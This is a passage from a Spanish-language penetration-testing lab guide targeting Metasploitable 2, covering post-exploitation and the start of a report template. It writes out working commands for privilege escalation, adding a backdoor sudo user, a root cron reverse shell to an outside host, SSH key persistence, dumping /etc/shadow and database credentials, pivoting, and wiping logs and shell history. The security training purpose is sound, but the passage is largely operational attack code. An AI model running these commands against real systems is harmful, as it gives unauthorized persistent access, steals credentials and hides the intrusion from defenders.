+<span id="cb43-517"><a href="#cb43-517" aria-hidden="true" tabindex="-1"></a><span class="fu">### 4.2 Escalada de Privilegios (desde usuario no-root)</span></span>
+<span id="cb43-518"><a href="#cb43-518" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-519"><a href="#cb43-519" aria-hidden="true" tabindex="-1"></a>Si el acceso obtenido es de usuario limitado (ej: <span class="in">`ircd`</span>), usar los siguientes métodos:</span>
+<span id="cb43-520"><a href="#cb43-520" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-521"><a href="#cb43-521" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-522"><a href="#cb43-522" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 1: nmap interactivo (versión antigua con --interactive)</span></span>
+<span id="cb43-523"><a href="#cb43-523" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">--interactive</span></span>
+<span id="cb43-524"><a href="#cb43-524" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span><span class="op">&gt;</span> !sh</span>
+<span id="cb43-525"><a href="#cb43-525" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
+<span id="cb43-526"><a href="#cb43-526" aria-hidden="true" tabindex="-1"></a><span class="co"># uid=0(root)</span></span>
+<span id="cb43-527"><a href="#cb43-527" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-528"><a href="#cb43-528" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 2: Local Exploit Suggester en Metasploit</span></span>
+<span id="cb43-529"><a href="#cb43-529" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use post/multi/recon/local_exploit_suggester</span>
+<span id="cb43-530"><a href="#cb43-530" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set SESSION <span class="op">&lt;</span>id_sesion<span class="op">&gt;</span></span>
+<span id="cb43-531"><a href="#cb43-531" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> run</span>
+<span id="cb43-532"><a href="#cb43-532" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-533"><a href="#cb43-533" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 3: Exploit de kernel (si la versión es vulnerable)</span></span>
+<span id="cb43-534"><a href="#cb43-534" aria-hidden="true" tabindex="-1"></a><span class="co"># Linux 2.6.24 es vulnerable a varios exploits locales</span></span>
+<span id="cb43-535"><a href="#cb43-535" aria-hidden="true" tabindex="-1"></a><span class="ex">searchsploit</span> <span class="st">"linux kernel 2.6.24 local"</span></span>
+<span id="cb43-536"><a href="#cb43-536" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-537"><a href="#cb43-537" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-538"><a href="#cb43-538" aria-hidden="true" tabindex="-1"></a>**Output esperado (local_exploit_suggester)**:</span>
+<span id="cb43-539"><a href="#cb43-539" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-540"><a href="#cb43-540" aria-hidden="true" tabindex="-1"></a><span class="in">[*] 192.168.56.102 - Collecting local exploits for linux/x86...</span></span>
+<span id="cb43-541"><a href="#cb43-541" aria-hidden="true" tabindex="-1"></a><span class="in">[+] 192.168.56.102 - exploit/linux/local/udev_netlink: The target appears to be vulnerable.</span></span>
+<span id="cb43-542"><a href="#cb43-542" aria-hidden="true" tabindex="-1"></a><span class="in">[+] 192.168.56.102 - exploit/linux/local/sock_sendpage: The target appears to be vulnerable.</span></span>
+<span id="cb43-543"><a href="#cb43-543" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-544"><a href="#cb43-544" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-545"><a href="#cb43-545" aria-hidden="true" tabindex="-1"></a><span class="fu">### 4.3 Actualizar Shell a Meterpreter</span></span>
+<span id="cb43-546"><a href="#cb43-546" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-547"><a href="#cb43-547" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-548"><a href="#cb43-548" aria-hidden="true" tabindex="-1"></a><span class="co"># Desde msfconsole, con sesión de shell abierta</span></span>
+<span id="cb43-549"><a href="#cb43-549" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> sessions <span class="at">-l</span></span>
+<span id="cb43-550"><a href="#cb43-550" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-551"><a href="#cb43-551" aria-hidden="true" tabindex="-1"></a><span class="co"># Actualizar shell a meterpreter</span></span>
+<span id="cb43-552"><a href="#cb43-552" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> sessions <span class="at">-u</span> <span class="op">&lt;</span>id_sesion_shell<span class="op">&gt;</span></span>
+<span id="cb43-553"><a href="#cb43-553" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-554"><a href="#cb43-554" aria-hidden="true" tabindex="-1"></a><span class="co"># O hacer upgrade manual</span></span>
+<span id="cb43-555"><a href="#cb43-555" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use post/multi/manage/shell_to_meterpreter</span>
+<span id="cb43-556"><a href="#cb43-556" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set SESSION <span class="op">&lt;</span>id<span class="op">&gt;</span></span>
+<span id="cb43-557"><a href="#cb43-557" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> run</span>
+<span id="cb43-558"><a href="#cb43-558" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-559"><a href="#cb43-559" aria-hidden="true" tabindex="-1"></a><span class="co"># En la nueva sesión meterpreter</span></span>
+<span id="cb43-560"><a href="#cb43-560" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> sysinfo</span>
+<span id="cb43-561"><a href="#cb43-561" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> getuid</span>
+<span id="cb43-562"><a href="#cb43-562" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> getpid</span>
+<span id="cb43-563"><a href="#cb43-563" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-564"><a href="#cb43-564" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-565"><a href="#cb43-565" aria-hidden="true" tabindex="-1"></a><span class="fu">### 4.4 Persistencia</span></span>
+<span id="cb43-566"><a href="#cb43-566" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-567"><a href="#cb43-567" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-568"><a href="#cb43-568" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 1: Agregar usuario backdoor al sistema</span></span>
+<span id="cb43-569"><a href="#cb43-569" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
+<span id="cb43-570"><a href="#cb43-570" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
+<span id="cb43-571"><a href="#cb43-571" aria-hidden="true" tabindex="-1"></a><span class="ex">useradd</span> <span class="at">-m</span> <span class="at">-s</span> /bin/bash <span class="at">-G</span> sudo backd00r</span>
+<span id="cb43-572"><a href="#cb43-572" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"backd00r:P@ssw0rd123!"</span> <span class="kw">|</span> <span class="ex">chpasswd</span></span>
+<span id="cb43-573"><a href="#cb43-573" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"backd00r ALL=(ALL) NOPASSWD:ALL"</span> <span class="op">&gt;&gt;</span> /etc/sudoers</span>
+<span id="cb43-574"><a href="#cb43-574" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-575"><a href="#cb43-575" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar</span></span>
+<span id="cb43-576"><a href="#cb43-576" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> backd00r /etc/passwd</span>
+<span id="cb43-577"><a href="#cb43-577" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> backd00r /etc/sudoers</span>
+<span id="cb43-578"><a href="#cb43-578" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-579"><a href="#cb43-579" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 2: Cron job de reverse shell</span></span>
+<span id="cb43-580"><a href="#cb43-580" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
+<span id="cb43-581"><a href="#cb43-581" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.56.101/9999 0&gt;&amp;1"</span> <span class="op">&gt;&gt;</span> /etc/crontab</span>
+<span id="cb43-582"><a href="#cb43-582" aria-hidden="true" tabindex="-1"></a><span class="fu">crontab</span> <span class="at">-l</span></span>
+<span id="cb43-583"><a href="#cb43-583" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-584"><a href="#cb43-584" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 3: Agregar clave SSH pública</span></span>
+<span id="cb43-585"><a href="#cb43-585" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> /root/.ssh</span>
+<span id="cb43-586"><a href="#cb43-586" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"ssh-rsa AAAA...tu_clave_publica..."</span> <span class="op">&gt;&gt;</span> /root/.ssh/authorized_keys</span>
+<span id="cb43-587"><a href="#cb43-587" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 600 /root/.ssh/authorized_keys</span>
+<span id="cb43-588"><a href="#cb43-588" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-589"><a href="#cb43-589" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar acceso persistente</span></span>
+<span id="cb43-590"><a href="#cb43-590" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="at">-i</span> ~/.ssh/id_rsa root@192.168.56.102</span>
+<span id="cb43-591"><a href="#cb43-591" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-592"><a href="#cb43-592" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-593"><a href="#cb43-593" aria-hidden="true" tabindex="-1"></a><span class="fu">### 4.5 Exfiltración de Datos</span></span>
+<span id="cb43-594"><a href="#cb43-594" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-595"><a href="#cb43-595" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-596"><a href="#cb43-596" aria-hidden="true" tabindex="-1"></a><span class="co"># Exfiltrar archivos sensibles del objetivo</span></span>
+<span id="cb43-597"><a href="#cb43-597" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> download /etc/passwd /tmp/exfil_passwd.txt</span>
+<span id="cb43-598"><a href="#cb43-598" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> download /etc/shadow /tmp/exfil_shadow.txt</span>
+<span id="cb43-599"><a href="#cb43-599" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-600"><a href="#cb43-600" aria-hidden="true" tabindex="-1"></a><span class="co"># Con shell — copiar archivos de configuración</span></span>
+<span id="cb43-601"><a href="#cb43-601" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
+<span id="cb43-602"><a href="#cb43-602" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/passwd</span>
+<span id="cb43-603"><a href="#cb43-603" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/shadow</span>
+<span id="cb43-604"><a href="#cb43-604" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> /home <span class="at">-name</span> <span class="st">"*.txt"</span> <span class="at">-o</span> <span class="at">-name</span> <span class="st">"*.conf"</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
+<span id="cb43-605"><a href="#cb43-605" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> /var/www <span class="at">-name</span> <span class="st">"config.php"</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
+<span id="cb43-606"><a href="#cb43-606" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-607"><a href="#cb43-607" aria-hidden="true" tabindex="-1"></a><span class="co"># Leer configuración de MySQL (credenciales en texto claro)</span></span>
+<span id="cb43-608"><a href="#cb43-608" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/mysql/my.cnf</span>
+<span id="cb43-609"><a href="#cb43-609" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /var/www/dvwa/config/config.inc.php</span>
+<span id="cb43-610"><a href="#cb43-610" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-611"><a href="#cb43-611" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-612"><a href="#cb43-612" aria-hidden="true" tabindex="-1"></a>**Output esperado (config.inc.php)**:</span>
+<span id="cb43-613"><a href="#cb43-613" aria-hidden="true" tabindex="-1"></a><span class="in">```php</span></span>
+<span id="cb43-614"><a href="#cb43-614" aria-hidden="true" tabindex="-1"></a><span class="va">$_DVWA</span>[ <span class="st">'db_user'</span> ]     <span class="op">=</span> <span class="st">'root'</span><span class="ot">;</span></span>
+<span id="cb43-615"><a href="#cb43-615" aria-hidden="true" tabindex="-1"></a><span class="va">$_DVWA</span>[ <span class="st">'db_password'</span> ] <span class="op">=</span> <span class="st">'toor'</span><span class="ot">;</span></span>
+<span id="cb43-616"><a href="#cb43-616" aria-hidden="true" tabindex="-1"></a><span class="va">$_DVWA</span>[ <span class="st">'db_database'</span> ] <span class="op">=</span> <span class="st">'dvwa'</span><span class="ot">;</span></span>
+<span id="cb43-617"><a href="#cb43-617" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-618"><a href="#cb43-618" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-619"><a href="#cb43-619" aria-hidden="true" tabindex="-1"></a><span class="fu">### 4.6 Movimiento Lateral y Pivoting (Conceptual)</span></span>
+<span id="cb43-620"><a href="#cb43-620" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-621"><a href="#cb43-621" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-622"><a href="#cb43-622" aria-hidden="true" tabindex="-1"></a><span class="co"># Ver interfaces de red del objetivo (buscar otras subredes)</span></span>
+<span id="cb43-623"><a href="#cb43-623" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> ipconfig</span>
+<span id="cb43-624"><a href="#cb43-624" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> route</span>
+<span id="cb43-625"><a href="#cb43-625" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-626"><a href="#cb43-626" aria-hidden="true" tabindex="-1"></a><span class="co"># Agregar ruta de pivoting en Metasploit</span></span>
+<span id="cb43-627"><a href="#cb43-627" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> route add 10.0.0.0/24 <span class="op">&lt;</span>id_sesion<span class="op">&gt;</span></span>
+<span id="cb43-628"><a href="#cb43-628" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> route print</span>
+<span id="cb43-629"><a href="#cb43-629" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-630"><a href="#cb43-630" aria-hidden="true" tabindex="-1"></a><span class="co"># Configurar proxy SOCKS para redirigir tráfico</span></span>
+<span id="cb43-631"><a href="#cb43-631" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use auxiliary/server/socks_proxy</span>
+<span id="cb43-632"><a href="#cb43-632" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set SRVPORT 1080</span>
+<span id="cb43-633"><a href="#cb43-633" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set VERSION 5</span>
+<span id="cb43-634"><a href="#cb43-634" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> run <span class="at">-j</span></span>
+<span id="cb43-635"><a href="#cb43-635" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-636"><a href="#cb43-636" aria-hidden="true" tabindex="-1"></a><span class="co"># Usar proxychains para alcanzar red interna</span></span>
+<span id="cb43-637"><a href="#cb43-637" aria-hidden="true" tabindex="-1"></a><span class="co"># Editar /etc/proxychains4.conf: agregar "socks5 127.0.0.1 1080"</span></span>
+<span id="cb43-638"><a href="#cb43-638" aria-hidden="true" tabindex="-1"></a><span class="ex">proxychains</span> nmap <span class="at">-sT</span> <span class="at">-Pn</span> <span class="at">-p</span> 22,80,443 10.0.0.1</span>
+<span id="cb43-639"><a href="#cb43-639" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-640"><a href="#cb43-640" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-641"><a href="#cb43-641" aria-hidden="true" tabindex="-1"></a><span class="fu">### 4.7 Borrado de Huellas</span></span>
+<span id="cb43-642"><a href="#cb43-642" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-643"><a href="#cb43-643" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-644"><a href="#cb43-644" aria-hidden="true" tabindex="-1"></a><span class="co"># Eliminar logs del sistema</span></span>
+<span id="cb43-645"><a href="#cb43-645" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> clearev</span>
+<span id="cb43-646"><a href="#cb43-646" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-647"><a href="#cb43-647" aria-hidden="true" tabindex="-1"></a><span class="co"># O manualmente desde shell</span></span>
+<span id="cb43-648"><a href="#cb43-648" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
+<span id="cb43-649"><a href="#cb43-649" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/auth.log</span>
+<span id="cb43-650"><a href="#cb43-650" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/syslog</span>
+<span id="cb43-651"><a href="#cb43-651" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/apache2/access.log</span>
+<span id="cb43-652"><a href="#cb43-652" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/apache2/error.log</span>
+<span id="cb43-653"><a href="#cb43-653" aria-hidden="true" tabindex="-1"></a><span class="bu">history</span> <span class="at">-c</span></span>
+<span id="cb43-654"><a href="#cb43-654" aria-hidden="true" tabindex="-1"></a><span class="bu">unset</span> <span class="va">HISTFILE</span></span>
+<span id="cb43-655"><a href="#cb43-655" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-656"><a href="#cb43-656" aria-hidden="true" tabindex="-1"></a><span class="co"># Eliminar archivos creados durante el pentest</span></span>
+<span id="cb43-657"><a href="#cb43-657" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="at">-f</span> /tmp/vector1_evidencia.txt</span>
+<span id="cb43-658"><a href="#cb43-658" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-659"><a href="#cb43-659" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-660"><a href="#cb43-660" aria-hidden="true" tabindex="-1"></a><span class="at">&gt; **Nota pedagógica**: En un pentest real, el borrado de huellas requiere coordinación con el cliente. Los logs son evidencia forense valiosa para el equipo Blue Team. En este lab, documentar los comandos sin ejecutarlos en producción.</span></span>
+<span id="cb43-661"><a href="#cb43-661" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-662"><a href="#cb43-662" aria-hidden="true" tabindex="-1"></a>**Entregable Fase 4**: Log completo de comandos ejecutados con outputs, capturas de pantalla mostrando: escalada de privilegios, usuario persistente creado, archivos exfiltrados.</span>
+<span id="cb43-663"><a href="#cb43-663" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-664"><a href="#cb43-664" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb43-665"><a href="#cb43-665" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-666"><a href="#cb43-666" aria-hidden="true" tabindex="-1"></a><span class="fu">## Fase 5: Reporte Profesional</span></span>
+<span id="cb43-667"><a href="#cb43-667" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-668"><a href="#cb43-668" aria-hidden="true" tabindex="-1"></a>**Objetivo**: Documentar todos los hallazgos en un reporte ejecutivo y técnico siguiendo estándares de la industria (PTES, OWASP Testing Guide).</span>
+<span id="cb43-669"><a href="#cb43-669" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-670"><a href="#cb43-670" aria-hidden="true" tabindex="-1"></a><span class="fu">### 5.1 Estructura del Reporte</span></span>
+<span id="cb43-671"><a href="#cb43-671" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-672"><a href="#cb43-672" aria-hidden="true" tabindex="-1"></a><span class="in">```markdown</span></span>
+<span id="cb43-673"><a href="#cb43-673" aria-hidden="true" tabindex="-1"></a><span class="fu"># Informe de Prueba de Penetración</span></span>
+<span id="cb43-674"><a href="#cb43-674" aria-hidden="true" tabindex="-1"></a>**Cliente**: <span class="co">[</span><span class="ot">Nombre del cliente</span><span class="co">]</span></span>
+<span id="cb43-675"><a href="#cb43-675" aria-hidden="true" tabindex="-1"></a>**Clasificación**: CONFIDENCIAL</span>
+<span id="cb43-676"><a href="#cb43-676" aria-hidden="true" tabindex="-1"></a>**Fecha**: <span class="co">[</span><span class="ot">Fecha de entrega</span><span class="co">]</span></span>
+<span id="cb43-677"><a href="#cb43-677" aria-hidden="true" tabindex="-1"></a>**Versión**: 1.0</span>
+<span id="cb43-678"><a href="#cb43-678" aria-hidden="true" tabindex="-1"></a>**Preparado por**: <span class="co">[</span><span class="ot">Tu nombre</span><span class="co">]</span></span>
+<span id="cb43-679"><a href="#cb43-679" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-680"><a href="#cb43-680" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb43-681"><a href="#cb43-681" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-682"><a href="#cb43-682" aria-hidden="true" tabindex="-1"></a><span class="fu">## 1. Resumen Ejecutivo</span></span>
+<span id="cb43-683"><a href="#cb43-683" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-684"><a href="#cb43-684" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.1 Alcance</span></span>
+<span id="cb43-685"><a href="#cb43-685" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Sistema objetivo**: Metasploitable 2 (192.168.56.102)</span>
+<span id="cb43-686"><a href="#cb43-686" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Período de prueba**: <span class="co">[</span><span class="ot">Fecha inicio</span><span class="co">]</span> — <span class="co">[</span><span class="ot">Fecha fin</span><span class="co">]</span></span>
+<span id="cb43-687"><a href="#cb43-687" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Metodología**: Caja negra / Caja gris</span>
+<span id="cb43-688"><a href="#cb43-688" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Herramientas**: Kali Linux, Metasploit Framework, nmap, enum4linux, nikto</span>
+<span id="cb43-689"><a href="#cb43-689" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-690"><a href="#cb43-690" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.2 Hallazgos Principales</span></span>
+<span id="cb43-691"><a href="#cb43-691" aria-hidden="true" tabindex="-1"></a>Durante la evaluación se identificaron **X vulnerabilidades críticas**, </span>
+<span id="cb43-692"><a href="#cb43-692" aria-hidden="true" tabindex="-1"></a>**Y altas** y **Z medias**. El sistema objetivo fue completamente </span>
+<span id="cb43-693"><a href="#cb43-693" aria-hidden="true" tabindex="-1"></a>comprometido en múltiples vectores, incluyendo acceso root remoto sin </span>
+<span id="cb43-694"><a href="#cb43-694" aria-hidden="true" tabindex="-1"></a>autenticación. Se recomienda parcheo inmediato de los servicios expuestos</span>
+<span id="cb43-695"><a href="#cb43-695" aria-hidden="true" tabindex="-1"></a>y segmentación de red.</span>
+<span id="cb43-696"><a href="#cb43-696" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-697"><a href="#cb43-697" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.3 Resumen de Riesgo</span></span>
+<span id="cb43-698"><a href="#cb43-698" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Criticidad <span class="pp">|</span> Cantidad <span class="pp">|</span></span>
+<span id="cb43-699"><a href="#cb43-699" aria-hidden="true" tabindex="-1"></a><span class="pp">|------------|----------|</span></span>
+<span id="cb43-700"><a href="#cb43-700" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Crítico    <span class="pp">|</span> 3        <span class="pp">|</span></span>
+<span id="cb43-701"><a href="#cb43-701" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Alto       <span class="pp">|</span> 2        <span class="pp">|</span></span>
+<span id="cb43-702"><a href="#cb43-702" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Medio      <span class="pp">|</span> 4        <span class="pp">|</span></span>
+<span id="cb43-703"><a href="#cb43-703" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Bajo       <span class="pp">|</span> 2        <span class="pp">|</span></span>
+<span id="cb43-704"><a href="#cb43-704" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-705"><a href="#cb43-705" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb43-706"><a href="#cb43-706" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-707"><a href="#cb43-707" aria-hidden="true" tabindex="-1"></a><span class="fu">## 2. Hallazgos Técnicos</span></span>
+<span id="cb43-708"><a href="#cb43-708" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-709"><a href="#cb43-709" aria-hidden="true" tabindex="-1"></a><span class="fu">### Finding 1 — vsftpd 2.3.4 Backdoor</span></span>
+<span id="cb43-710"><a href="#cb43-710" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-711"><a href="#cb43-711" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Campo        <span class="pp">|</span> Detalle                                     <span class="pp">|</span></span>
+<span id="cb43-712"><a href="#cb43-712" aria-hidden="true" tabindex="-1"></a><span class="pp">|--------------|---------------------------------------------|</span></span>
+<span id="cb43-713"><a href="#cb43-713" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **CVE**      <span class="pp">|</span> CVE-2011-2523                               <span class="pp">|</span></span>
+<span id="cb43-714"><a href="#cb43-714" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **CVSS v3**  <span class="pp">|</span> 9.8 (Crítico)                               <span class="pp">|</span></span>
+<span id="cb43-715"><a href="#cb43-715" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Puerto**   <span class="pp">|</span> 21/tcp (FTP)                                <span class="pp">|</span></span>
+<span id="cb43-716"><a href="#cb43-716" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Servicio** <span class="pp">|</span> vsftpd 2.3.4                                <span class="pp">|</span></span>
+<span id="cb43-717"><a href="#cb43-717" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Impacto**  <span class="pp">|</span> Ejecución remota de código como root        <span class="pp">|</span></span>
+<span id="cb43-718"><a href="#cb43-718" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-719"><a href="#cb43-719" aria-hidden="true" tabindex="-1"></a>**Descripción**: La versión 2.3.4 de vsftpd fue distribuida con una </span>
+<span id="cb43-720"><a href="#cb43-720" aria-hidden="true" tabindex="-1"></a>backdoor maliciosa. Al autenticarse con un usuario que contenga <span class="in">`:)`</span>, </span>
+<span id="cb43-721"><a href="#cb43-721" aria-hidden="true" tabindex="-1"></a>el servidor abre una shell root en el puerto 6200.</span>
+<span id="cb43-722"><a href="#cb43-722" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-723"><a href="#cb43-723" aria-hidden="true" tabindex="-1"></a>**Pasos de reproducción**:</span>
+<span id="cb43-724"><a href="#cb43-724" aria-hidden="true" tabindex="-1"></a><span class="ss">1. </span>Conectar al puerto 21 de la víctima</span>
+<span id="cb43-725"><a href="#cb43-725" aria-hidden="true" tabindex="-1"></a><span class="ss">2. </span>Enviar usuario <span class="in">`cualquiera:)`</span> con contraseña aleatoria</span>
+<span id="cb43-726"><a href="#cb43-726" aria-hidden="true" tabindex="-1"></a><span class="ss">3. </span>Conectar al puerto 6200 para obtener shell root</span>
+<span id="cb43-727"><a href="#cb43-727" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-728"><a href="#cb43-728" aria-hidden="true" tabindex="-1"></a>**Evidencia**:</span>
+<span id="cb43-729"><a href="#cb43-729" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
